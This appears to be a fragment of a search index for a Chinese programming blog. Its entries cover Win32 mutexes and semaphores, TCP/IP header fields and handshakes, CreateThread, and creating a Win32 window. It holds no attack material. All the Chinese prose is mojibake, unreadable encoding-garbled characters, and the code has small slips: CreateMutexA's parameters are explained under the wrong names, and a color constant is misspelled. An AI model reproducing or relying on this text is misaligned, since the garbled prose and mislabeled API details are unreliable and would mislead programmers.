åœ¨ç»“æŸæ—¶å°†çº¿ç¨‹1è®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€ è¿™æ ·å°±å¯ä»¥ä½¿ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿è¿›è¡Œï¼Œä¸”å……åˆ†åˆ©ç”¨äº†CPU äº’æ–¥ä½“åˆ›å»ºäº’æ–¥ä½“12345HANDLE CreateMutexA( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName); dwDesiredAccess äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL bInheritHandle å¦‚æœæ­¤å€¼ä¸ºTRUEï¼Œå¹¶ä¸”è°ƒç”¨æ–¹åˆ›å»ºäº†äº’æ–¥é‡ï¼Œåˆ™è°ƒç”¨çº¿ç¨‹å°†è·å¾—è¯¥äº’æ–¥å¯¹è±¡çš„åˆå§‹æ‰€æœ‰æƒã€‚å¦åˆ™ï¼Œè°ƒç”¨çº¿ç¨‹å°†æ— æ³•è·å¾—è¯¥äº’æ–¥é”çš„æ‰€æœ‰æƒã€‚ lpName åˆ›å»ºçš„äº’æ–¥ä½“çš„åç§°ï¼Œå¦‚æœåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨å¯ä»¥ä¸ºNULLï¼Œå¦‚æœåœ¨ä¸åŒè¿›ç¨‹ä¸­ä½¿ç”¨éœ€è¦èµ‹äºˆåç§° åœ¨å…¶ä»–è¿›ç¨‹ä¸­æ‰“å¼€äº’æ–¥ä½“12345HANDLE OpenMutexW( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName); dwDesiredAccess äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL bInheritHandle å¦‚æœæ­¤å€¼ä¸ºTRUEï¼Œåˆ™æ­¤è¿›ç¨‹åˆ›å»ºçš„è¿›ç¨‹å°†ç»§æ‰¿è¯¥å¥æŸ„ã€‚å¦åˆ™ï¼Œè¿›ç¨‹å°†ä¸ä¼šç»§æ‰¿æ­¤å¥æŸ„ lpName éœ€è¦æ‰“å¼€çš„äº’æ–¥ä½“çš„åç§° é‡Šæ”¾æŒ‡å®šäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒ123BOOL ReleaseMutex( HANDLE hMutex); hMutex äº’æ–¥å¯¹è±¡çš„å¥æŸ„ã€‚è¯¥ CreateMutexæˆ–OpenMutexå‡½æ•°è¿”å›æ­¤å¥æŸ„ã€‚ ä¿¡å·é‡åˆ›å»ºä¿¡å·é‡123456HANDLE CreateSemaphoreW( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCWSTR lpName); lpSemaphoreAttributes äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL lInitialCount ä¿¡å·é‡å¯¹è±¡çš„åˆå§‹è®¡æ•°ã€‚æ­¤å€¼å¿…é¡»å¤§äºæˆ–ç­‰äºé›¶ä¸”å°äºæˆ–ç­‰äºlMaximumCountã€‚å½“ä¿¡å·é‡çš„è®¡æ•°å¤§äºé›¶æ—¶ï¼Œå°†å‘å‡ºä¿¡å·çŠ¶æ€ï¼›åœ¨ä¿¡å·é‡ä¸ºé›¶æ—¶ï¼Œå°†ä¸å‘å‡ºä¿¡å·çŠ¶æ€ã€‚æ¯å½“ç­‰å¾…å‡½æ•°é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡çš„çº¿ç¨‹æ—¶ï¼Œè®¡æ•°å°±ä¼šå‡å°‘ä¸€ã€‚é€šè¿‡è°ƒç”¨ReleaseSemaphoreå‡½æ•°å°†è®¡æ•°å¢åŠ æŒ‡å®šçš„æ•°é‡ ã€‚ lMaximumCount ä¿¡å·é‡å¯¹è±¡çš„æœ€å¤§è®¡æ•°ã€‚è¯¥å€¼å¿…é¡»å¤§äºé›¶ã€‚ lpName åˆ›å»ºçš„ä¿¡å·é‡åç§°ï¼Œå¯ä»¥NULL é‡Šæ”¾ç­‰å¾…ä¿¡å·é‡12345BOOL ReleaseSemaphore( HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount); hSemaphore ä¿¡å·é‡å¯¹è±¡çš„å¥æŸ„ã€‚è¯¥ CreateSemaphoreæˆ– OpenSemaphoreå‡½æ•°è¿”å›è¯¥å¥æŸ„ã€‚ lReleaseCount ä¿¡å·é‡å¯¹è±¡çš„å½“å‰è®¡æ•°è¦å¢åŠ çš„æ•°é‡ã€‚è¯¥å€¼å¿…é¡»å¤§äºé›¶ã€‚å¦‚æœæŒ‡å®šçš„æ•°é‡å°†å¯¼è‡´ä¿¡å·é‡çš„è®¡æ•°è¶…è¿‡åˆ›å»ºä¿¡å·é‡æ—¶æŒ‡å®šçš„æœ€å¤§è®¡æ•°ï¼Œåˆ™è¯¥è®¡æ•°ä¸ä¼šæ›´æ”¹ï¼Œå‡½æ•°å°†è¿”å›FALSEã€‚ lpPreviousCount æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œä»¥æ¥æ”¶ä¿¡å·é‡çš„å…ˆå‰è®¡æ•°ã€‚å¦‚æœä¸éœ€è¦ä¸Šä¸€ä¸ªè®¡æ•°ï¼Œåˆ™æ­¤å‚æ•°å¯ä»¥ä¸ºNULLã€‚"},{"title":"TCP/IP","date":"2021-08-08T09:19:19.506Z","updated":"2021-08-08T09:19:19.506Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/NetWork/TCP.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/NetWork/TCP.html","excerpt":"","text":"IPå¸¸ç”¨çš„ä¸‰ç§ç±»åˆ«IPåœ°å€åœ°å€è§£æåè®®ARPIPæ•°æ®åŒ…æ ¼å¼å­ç½‘åˆ’åˆ† å­ç½‘å·ä¸èƒ½ä¸ºå…¨0æˆ–å…¨1 åˆ¤æ–­ä¸¤å°ä¸»æœºæ˜¯å¦åœ¨åŒä¸€ç½‘æ®µï¼Œæœ¬ä¸»æœºçš„å­ç½‘æ©ç ä¸å¯¹æ–¹çš„IPåœ°å€è¿›è¡Œä¸è¿ç®—ï¼Œåœ¨ä¸è‡ªå·±çš„ç½‘ç»œå·è¿›è¡Œæ¯”è¾ƒ å­ç½‘æ©ç è¶…ç½‘åˆ’åˆ†ï¼ˆæ— åˆ†ç±»ç¼–å€CIDRï¼‰æ— åˆ†ç±»çš„äºŒçº§ç¼–å€ï¼ˆ**IPåœ°å€ ::= {&lt;ç½‘ç»œå‰ç¼€&gt;,&lt;ä¸»æœºå·&gt;}**ï¼‰ ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ICMPTCP å„å­—æ®µæ„ä¹‰åºå·å¦‚æœæŠ¥æ–‡æ•°æ®éƒ¨åˆ†é•¿åº¦ä¸º0ï¼Œåˆ™é»˜è®¤å¢åŠ 1ä¸ªå­—èŠ‚ å 4å­—èŠ‚ é¦–å…ˆï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹çš„æ¯ä¸€ä¸ªå­—èŠ‚éƒ½ä¼šæœ‰ä¸€ä¸ªç¼–å· åœ¨å»ºç«‹è¿æ¥åï¼Œåºå·ä»£è¡¨ï¼šè¿™ä¸€æ¬¡ä¼ ç»™å¯¹æ–¹çš„TCPæ•°æ®éƒ¨åˆ†çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å· ç¡®è®¤å·å½“æ ‡å¿—ä½ä¸­çš„ACKä¸º1æ—¶ï¼Œç¡®è®¤å·æ‰æœ‰æ•ˆ å 4å­—èŠ‚ ç¡®è®¤æ”¶åˆ°å‰é¢çš„åŒ… åœ¨å»ºç«‹è¿æ¥åï¼ŒæœŸæœ›å¯¹æ–¹ä¸‹ä¸€æ¬¡å‘é€çš„TCPæ•°æ®éƒ¨åˆ†ç¬¬ä¸€ä¸ªå­—èŠ‚çš„å¼€å§‹åºå· æ•°æ®åç§» å 4ä¸ªbitï¼ˆå–å€¼èŒƒå›´ä¸º5~15ï¼‰ Header Lengthä¹˜5ç­‰äºTCPé¦–éƒ¨é•¿åº¦ï¼ˆä¹Ÿç­‰äºæ•°æ®åç§»ï¼‰ é¦–éƒ¨é•¿åº¦èŒƒå›´ï¼ˆ20~60ï¼‰ ä¿ç•™ å 6ä¸ªbitï¼Œä¸€èˆ¬æƒ…å†µä¸‹å…¨ä¸º0 U/A/P/R/S/F URGï¼ˆUrgentï¼‰å½“URG = 1æ—¶ï¼Œç´§æ€¥æŒ‡é’ˆå­—æ®µæ‰æœ‰æ•ˆã€‚è¡¨æ˜å½“å‰æŠ¥æ–‡æ®µä¸­æœ‰ç´§æ€¥æ•°æ®ï¼Œåº”ä¼˜å…ˆå°½å¿«ä¼ é€ ACKï¼ˆAcknowledgmentï¼‰å½“ACK = 1æ—¶ï¼Œç¡®è®¤å·å­—æ®µæ‰æœ‰æ•ˆ PSHï¼ˆPushï¼‰RSTï¼ˆResetï¼‰å½“RST = 1æ—¶ï¼Œè¡¨æ˜è¿æ¥ä¸­å‡ºç°ä¸¥é‡å·®é”™ï¼Œå¿…é¡»é‡Šæ”¾è¿æ¥ï¼Œç„¶åå†é‡æ–°å»ºç«‹è¿æ¥ SYNï¼ˆSynchronizationï¼‰å½“SYN = 1ã€ACK = 0 æ—¶ï¼Œè¡¨æ˜è¿™æ˜¯ä¸€ä¸ªå»ºç«‹è¿æ¥çš„è¯·æ±‚è‹¥å¯¹æ–¹åŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™å›å¤SYN = 1ã€ACK = 1 FINï¼ˆFinishï¼‰å½“FIN = 1æ—¶ï¼Œè¡¨æ˜æ•°æ®å·²ç»å‘é€å®Œæ¯•ï¼Œè¦æ±‚é‡Šæ”¾è¿æ¥ çª—å£æ£€éªŒå’Œ ä¼ªé¦–éƒ¨+é¦–éƒ¨+æ•°æ®éƒ¨åˆ† ä¼ªé¦–éƒ¨ä¸ä¼šä¼ è¾“ç»™ä¸‹ä¸€å±‚ ç´§æ€¥æŒ‡é’ˆå¯é ä¼ è¾“ARQï¼ˆAutomatic Repeat-reQuestï¼‰ ç†æƒ³æƒ…å†µ æ„å¤–æƒ…å†µ ç¡®è®¤ä¸¢å¤± ç¡®è®¤è¿Ÿåˆ° ç¼ºç‚¹ï¼šæ•ˆç‡éå¸¸ä½ è¿ç»­ARQ+æ»‘åŠ¨çª—å£ SACKï¼ˆselective é€‰æ‹©æ€§ç¡®è®¤ï¼‰ åŒ…å«äºTCPé¦–éƒ¨å¯é€‰éƒ¨åˆ† æ„å¤–æƒ…å†µ æµé‡æ§åˆ¶æ‹¥å¡æ§åˆ¶å»ºç«‹è¿æ¥ &amp;&amp; é‡Šæ”¾è¿æ¥ ä¸‰æ¬¡æ¡æ‰‹ ç¬¬ä¸€æ¬¡æ¡æ‰‹ ç¬¬äºŒæ¬¡æ¡æ‰‹ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ å››æ¬¡æŒ¥æ‰‹ å°†2ï¼Œ3æ¬¡æŒ¥æ‰‹åˆå¹¶"},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•-2(åˆ›å»ºçº¿ç¨‹)","date":"2021-08-08T08:46:15.114Z","updated":"2021-08-08T08:46:15.114Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-2.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-2.html","excerpt":"","text":"âœˆâœˆå›¾å½¢åŒ–ç•Œé¢åˆ›å»ºè¿‡ç¨‹ç•¥è¿‡âœˆâœˆ CreateThreadå‡½æ•°ä»‹ç» MSDNå¯¹CreateThreadçš„è§£é‡Š 12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); ä¸­æ–‡ç‰ˆ 123456789101112131415HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, // å®‰å…¨å±æ€§ é€šå¸¸ä¸ºNULL SIZE_T dwStackSize, // å‚æ•°ç”¨äºè®¾å®šçº¿ç¨‹å¯ä»¥å°†å¤šå°‘åœ°å€ç©ºé—´ç”¨äºå®ƒè‡ªå·±çš„å †æ ˆ // æ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰å®ƒè‡ªå·±çš„å †æ ˆ LPTHREAD_START_ROUTINE lpStartAddress, // å‚æ•°ç”¨äºæŒ‡æ˜æƒ³è¦æ–°çº¿ç¨‹æ‰§è¡Œçš„çº¿ç¨‹å‡½æ•°çš„åœ°å€ LPVOID lpParameter, // çº¿ç¨‹å‡½æ•°çš„å‚æ•° // åœ¨çº¿ç¨‹å¯åŠ¨æ‰§è¡Œæ—¶å°†è¯¥å‚æ•°ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°// æ—¢å¯ä»¥æ˜¯æ•°å­—ï¼Œä¹Ÿå¯ä»¥æ˜¯æŒ‡å‘åŒ…å«å…¶ä»–ä¿¡æ¯çš„ä¸€ä¸ªæ•°æ®ç»“æ„çš„æŒ‡é’ˆ DWORD dwCreationFlags, // 0 åˆ›å»ºå®Œæ¯•ç«‹å³è°ƒåº¦ CREATE_SUSPENDEDåˆ›å»ºåæŒ‚èµ· LPDWORD lpThreadId // çº¿ç¨‹ID ); // è¿”å›å€¼ï¼šçº¿ç¨‹å¥æŸ„ ç•Œé¢èµ„æºä»‹ç» WinMainå‡½æ•°12345678910int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, DiaLogProc); return 0;&#125; DiaLogProcå‡½æ•°ï¼ˆæ¶ˆæ¯å›è°ƒå‡½æ•°ï¼‰123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354BOOL CALLBACK DiaLogProc( HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; switch (uMsg) &#123; case WM_INITDIALOG: &#123; ********************************è·å¾—ä¸¤ä¸ªçª—å£å¥æŸ„*************************** hEDIT_ONE = GetDlgItem(hwndDlg, IDC_EDIT_ONE); hEDIT_TWO = GetDlgItem(hwndDlg, IDC_EDIT_TWO); ************************************************************************ ********************************åˆå§‹åŒ–çª—å£******************************** SetWindowText(hEDIT_ONE, &quot;1000&quot;); SetWindowText(hEDIT_TWO, &quot;0&quot;); ************************************************************************ break; &#125; case WM_COMMAND: &#123; switch (LOWORD(wParam)) &#123; case IDC_BUTTON: &#123; *****************************åˆ›å»ºäº†ä¸¤ä¸ªçº¿ç¨‹***************************** HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1, NULL, 0, NULL); HANDLE hThread2 = ::CreateThread(NULL, 0, ThreadProc2, NULL, 0, NULL); ********************************************************************** ::CloseHandle(hThread1); ::CloseHandle(hThread2); return TRUE; &#125; &#125; break; &#125; case WM_CLOSE: &#123; DestroyWindow(hwndDlg); &#125; default: &#123; return DefWindowProc(hwndDlg, uMsg, wParam, lParam); &#125; break; &#125;&#125; çº¿ç¨‹å‡½æ•°1æ³¨æ„è¿™é‡Œç›´æ¥å°†è¿”å›å€¼(çº¿ç¨‹å¥æŸ„)è®¾ç½®ä¸º0ï¼Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹å‡½æ•°ä¸è¿™ä¸ªç›¸ä¼¼ï¼Œä¸åœ¨è´´å‡ºæ¥ã€‚ 12345678910111213141516171819202122DWORD WINAPI ThreadProc1( LPVOID lpParameter)&#123; //å°†æ–‡æœ¬æ¡†ä¸­çš„è¾“å…¥ä¼ å…¥Bufferä¸­ TCHAR szBuffer[10]; memset(szBuffer, 0, 10); GetWindowText(hEDIT_ONE, szBuffer, 10); //å°†Bufferä¸­çš„å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­— DWORD dwTimer; int check = sscanf((const char*)szBuffer, &quot;%d&quot;, &amp;dwTimer); while (dwTimer &gt; 0) &#123; Sleep(100); //åœ¨å°†æ•°å­—å‡1åå˜ä¸ºå­—ç¬¦ä¸² memset(szBuffer, 0, 10); sprintf((char*)szBuffer, &quot;%d&quot;, --dwTimer); //å°†å­—ç¬¦ä¸²æ”¾å›åˆ°æ–‡æœ¬æ¡†ä¸­ SetWindowText(hEDIT_ONE, szBuffer); &#125; return 0; &#125; æ•ˆæœ"},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•(æ³¨å†Œ-åˆ›å»ºçª—å£)-1","date":"2021-08-08T08:46:15.111Z","updated":"2021-08-08T08:46:15.111Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-1.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-1.html","excerpt":"","text":"WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°:WinMain()123456int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) è¿™æ˜¯åœ¨Windowsä¸‹ç¼–å†™çš„ç¨‹åºå…¥å£ï¼Œä¸‹é¢å¯¹å‚æ•°é€ä¸ªè§£é‡Š hInstance hInstanceæ˜¯åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ã€‚è¿™é‡Œçš„å®ä¾‹å¥æŸ„æ˜¯ç¨‹åºè£…å…¥å†…å­˜åçš„èµ·å§‹åœ°å€ã€‚ é€šè¿‡GetModuleHandle() å‚æ•°æ¥è·å¾—ã€‚ hPrevInstance åŒä¸€ä¸ªæ–‡ä»¶åˆ›å»ºçš„ä¸Šä¸€ä¸ªå®ä¾‹å¥æŸ„ã€‚è¿™ä¸ªå‚æ•°åœ¨Win32ä¸‹å·²ç»ä¸å†ä½¿ç”¨ã€‚ lpCmdLine ä¸»å‡½æ•°çš„å‚æ•°ï¼Œç”¨äºåœ¨ç¨‹åºå¯åŠ¨æ—¶ç»™è¿›ç¨‹ä¼ é€’å‚æ•° ç‚¹å‡»å¼€å§‹ï¼Œæ‰“å¼€è¿è¡Œçª—å£ï¼Œè¾“å…¥â€notepad C:\\boot.iniâ€ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨ä¸ºå°†å­˜å‚¨åœ¨Cç›˜ç›®å½•ä¸‹çš„book.iniæ–‡ä»¶ç”¨è®°äº‹æœ¬æ–¹å¼æ‰“å¼€ï¼Œç‚¹å‡»ç¡®å®šï¼Œè®°äº‹æœ¬å¼¹å‡ºï¼Œç”±äºæˆ‘çš„Cç›˜ç›®å½•ä¸‹æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æç¤ºæ–‡ä»¶ä¸å­˜åœ¨ã€‚ nCmdShow è¡¨ç¤ºè¿›ç¨‹æ˜¾ç¤ºæ–¹å¼ï¼Œå¯ä»¥ä¸ºæœ€å¤§åŒ–ï¼Œæœ€å°åŒ–ï¼Œéšè—ç­‰æ˜¾ç¤ºæ–¹å¼ã€‚ WinMainä¸­å‡½æ•°æµç¨‹æ³¨å†Œçª—å£ç±»ç¼–å†™Windowsç¨‹åºï¼ŒWinMain()å‡½æ•°çš„ä¸»è¦ä»»åŠ¡æ˜¯æ³¨å†Œä¸€ä¸ªçª—å£ç±»ï¼Œåˆ›å»ºä¸€ä¸ªçª—å£å¹¶æ˜¾ç¤ºåˆ›å»ºçš„çª—å£ï¼Œåœ¨ä¸åœçš„è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯å¹¶åˆ†å‘ç»™è‡ªå·±çš„çª—å£ã€‚çŸ¥é“æ¥å—åˆ°WM_QUITæ¶ˆæ¯åé€€å‡ºå¾ªç¯ç»“æŸè¿›ç¨‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; // TODO: Place code here. MSG Msg; BOOL bRet; //æ³¨å†Œçª—å£ç±» MyRegisterClass(hInstance); //åˆ›å»ºçª—å£å¹¶æ˜¾ç¤ºçª—å£ if(!InitInstance(hInstance, SW_SHOWNORMAL)) return FALSE; //æ¶ˆæ¯å¾ªç¯ //è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯å¹¶è¿›è¡Œåˆ†å‘ while( (bRet = GetMessage(&amp;Msg, NULL, 0, 0) != 0 ) &#123; if(bRet == -1) &#123; //handle the error and possibly exit //å¥æŸ„é”™è¯¯å¼ºåˆ¶é€€å‡º break; &#125; else &#123; TranslateMessage(&amp;Msg); DispatchMessage(&amp;Msg); &#125; &#125; return Msg.wParam;&#125; ä¸‹é¢å¯¹éƒ¨åˆ†å‡½æ•°çš„ä½œç”¨è¿›è¡Œè§£é‡Š GetMessageMSDNå¯¹äºè¯¥å‡½æ•°å‚æ•°çš„è§£é‡Š 123456BOOL GetMessage( LPMSG lpMsg, // message information HWND hWnd, // handle to window UINT wMsgFilterMin, // first message UINT wMsgFilterMax // last message); è¿™ä¸ªå‡½æ•°ç”¨æ¥è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯ï¼Œå¹¶å¡«å……MSGç»“æ„ä½“ TranslateMessage1BOOL TranslateMessage( CONST MSG *lpMsg // message information); è¯¥å‡½æ•°ç”¨äºå¤„ç†é”®ç›˜æ¶ˆæ¯ã€‚å°†è™šæ‹Ÿç æ¶ˆæ¯è½¬æ¢ä¸ºå­—ç¬¦æ¶ˆæ¯ DispatchMessage1LRESULT DispatchMessage( CONST MSG *lpmsg // message information); è¯¥å‡½æ•°ä½œç”¨ä¸ºå°†æ¶ˆæ¯åˆ†å‘ç»™çª—å£ æ³¨å†Œçª—å£ç±»çš„è‡ªå®šä¹‰å‡½æ•°åœ¨WinMain()å‡½æ•°ä¸­ï¼Œé¦–å…ˆè°ƒç”¨çš„æ˜¯MyRegisterClasså‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œéœ€è¦ä¼ é€’è¿›ç¨‹çš„å®ä¾‹å¥æŸ„hInstanceä½œä¸ºå‚æ•°ã€‚ è¯¥å‡½æ•°å®Œæˆçª—å£ç±»çš„æ³¨å†Œåˆ†ä¸ºä¸¤æ­¥ï¼š å¡«å……WNDCLASSEXç»“æ„ä½“ ã€‚è¿™ä¸ªæ­¥éª¤è¾ƒä¸ºå¤æ‚ è°ƒç”¨RegisterClassExå‡½æ•°è¿›è¡Œæ³¨å†Œ ä¸‹é¢ä»£ç ä»‹ç»äº†WNDCLASSEXç»“æ„ä½“çš„æ‰€æœ‰æˆå‘˜ï¼Œå…¶ä¸­æœ€é‡è¦çš„å­—æ®µä¸ºlpfnWndProcï¼Œä»–å°†ä¿å­˜çª—å£çš„è¿‡ç¨‹åœ°å€ã€‚çª—å£çš„è¿‡ç¨‹æ˜¯å¯¹å„ç§æ¶ˆæ¯è¿›ç¨‹å¤„ç†çš„**â€æ±‡èšåœ°â€** 12345678910111213141516171819202122232425262728293031323334353637ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEX WndCls; //å¡«å……ç»“æ„ä½“ä¸º0 ZeroMemory(&amp;WndCls, sizeof(WNDCLASSEX)); //cbSizeæ˜¯ç»“æ„ä½“å¤§å° WndCls.cbSize = sizeof(WNDCLASSEX); //lpfnWndProcæ˜¯çª—å£è¿‡ç¨‹åœ°å€ WndCls.lpfnWndProc = WindowProc; //hInstanceæ˜¯å®ä¾‹å¥æŸ„ WndCls.hInstance = hInstance; //lpszClassNameæ˜¯çª—å£ç±»ç±»å WndCls.lpszClassName = CLASSNAME; //styleæ˜¯çª—å£ç±»é£æ ¼ WndCls.style = 0x01; //hbrBackgroundæ˜¯çª—å£ç±»èƒŒæ™¯è‰² WndCls.hbrBackground = (HBRUSH)COLOR_WINDOWRARME + 1; //hCursoræ˜¯é¼ æ ‡å¥æŸ„ WndCls.hCursor = LoadCursor(NULL, IDC_ARROW); //hIconæ˜¯å›¾æ ‡å¥æŸ„ WndCls.hIcon = LoadIcon(NULL, IDI_QUESTION); //å…¶ä»– WndCls.cbClsExtra = 0; WndCls.cbWndExtra = 0; return RegisterClassEx(&amp;WndCls);&#125; åˆ›å»ºä¸»çª—å£å¹¶æ˜¾ç¤ºæ›´æ–°æ³¨å†Œçª—å£ç±»åï¼Œæ ¹æ®è¯¥çª—å£ç±»åˆ›å»ºå…·ä½“çš„ä¸»çª—å£å¹¶æ˜¾ç¤ºå’Œæ›´æ–°çª—å£ 123456789101112131415161718192021222324252627282930//åˆ›å»ºçª—å£å‡½æ•°BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; HWND hWnd = NULL; //åˆ›å»ºçª—å£ hWnd = CreateWindowEx(WS_EX_CLIENTEDGE, &quot;HelloWin32&quot;, &quot;MyFirstWindow&quot;, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, //çª—å£å¼¹å‡ºçš„xè½´ CW_USEDEFAULT, //å¼¹å‡ºçš„yè½´ CW_USEDEFAULT, //çª—å£å®½ CW_USEDEFAULT, //çª—å£é«˜ NULL, //çˆ¶çª—å£ NULL, //èœå•çª—å£ hInstance, //å½“å‰çª—å£å¥æŸ„ NULL); if( NULL == hWnd ) &#123; return FALSE; &#125; //æ˜¾ç¤ºçª—å£ ShowWindow(hWnd, nCmdShow); //æ›´æ–°çª—å£ UpdateWindow(hWnd); return TRUE;&#125; è°ƒç”¨è¯¥å‡½æ•°ï¼Œéœ€è¦ç»™è¯¥å‡½æ•°ä¼ é€’ç¤ºä¾‹å¥æŸ„å’Œçª—å£çš„æ˜¾ç¤ºæ–¹å¼ä¸¤ä¸ªå‚æ•°ã€‚åˆ†åˆ«ä¸ºWinMain()å‡½æ•°çš„ç¬¬1ä¸ªå‚æ•°å’Œç¬¬3ä¸ªå‚æ•°ã€‚ åˆ›å»ºä¸»çª—å£æ—¶è°ƒç”¨äº†CreateWindowEx()å‡½æ•°ï¼Œé€šè¿‡MSDNæŸ¥å¾—å‡½æ•°åŸå‹ 1234567891011HWND CreateWindowEx( DWORD dwExStyle, // extended window style LPCTSTR lpClassName, // registered class name LPCTSTR lpWindowName, // window name DWORD dwStyle, // window style int x, // horizontal position of window int y, // vertical position of window int nWidth, // window width int nHeight, // window height HWND hWndParent, // handle to parent or owner window HMENU hMenu, // menu handle or child identifier HINSTANCE hInstance, // handle to application instance LPVOID lpParam // window-creation data); ç¬¬2ä¸ªå‚æ•°æ˜¯lpClassName,æ ¹æ®æ³¨é‡Šï¼Œè¯¥å‚æ•°ä¸ºå·²æ³¨å†Œç±»åã€‚è¿™ä¸ªå·²ç»æ³¨å†Œçš„ç±»åå°±æ˜¯WNDCLASSEXç»“æ„ä½“çš„lpszClassNameå­—æ®µ å¤„ç†æ¶ˆæ¯çš„çª—å£è¿‡ç¨‹WindowProcå‡½æ•°ä»‹ç»çª—å£è¿‡ç¨‹çš„å®šä¹‰æ˜¯æŒ‰ç…§MSDNä¸Šç»™å‡ºçš„å½¢å¼è¿›è¡Œå®šä¹‰çš„ï¼ŒMSDNä¸­çš„å®šä¹‰å¦‚ä¸‹ 1234LRESULT CALLBACK WindowProc( HWND hwnd, // handle to window UINT uMsg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter); WindowProcæ˜¯çª—å£è¿‡ç¨‹çš„å‡½æ•°åï¼Œè¿™ä¸ªå‡½æ•°åå¯ä»¥éšæ„æ”¹å˜ï¼Œä½†æ˜¯çª—å£è¿‡ç¨‹çš„å‡½æ•°åå¿…é¡»ä¸WNDCLASSEXç»“æ„ä½“ä¸­lpfnWndProcçš„æˆå‘˜å˜é‡çš„å€¼ä¸€è‡´ã€‚ä¸‹é¢ä»‹ç»å‚æ•° å‚æ•°1ï¼šçª—å£å¥æŸ„ å‚æ•°2ï¼šæ¶ˆæ¯å€¼uMsg å‚æ•°3ä¸å‚æ•°4ï¼šè¿™ä¸¤ä¸ªå‚æ•°æ˜¯å¯¹äºæ¶ˆæ¯å€¼çš„é™„åŠ å‚æ•°ï¼Œå…·ä½“ç”¨æ³•éœ€è¦å‚ç…§MSDN æ­¤å‡½æ•°ä¹Ÿè¢«ç§°ä¸ºå›è°ƒå‡½æ•°ï¼Œä¸‹é¢ä¸ºæ¶ˆæ¯å›è°ƒå‡½æ•°ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041LRESULT CALLBACK WindowProc( HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; PAINTSTRUCT ps; HDC hDC; RECT rt; char *pszDrawText = &quot;Hello Windows Program&quot;; switch(uMsg) &#123; case WM_PAINT: &#123; hDC = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rt); DrawTextA(hDC, pszDrawText, strlen(pszDrawText),&amp;rt, DT_CENTER | DT_VCENTER | DT_SINGLELINE); EndPaint(hwnd, &amp;ps); break; &#125; case WM_CLOSE: &#123; if(IDYES == MessageBox(hwnd, &quot;æ˜¯å¦é€€å‡ºç¨‹åº&quot;, &quot;MyFirstWin&quot;, MB_YESNO)) &#123; DestroyWindow(hwnd); PostQuitMessage(0); &#125; break; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; return 0;&#125; 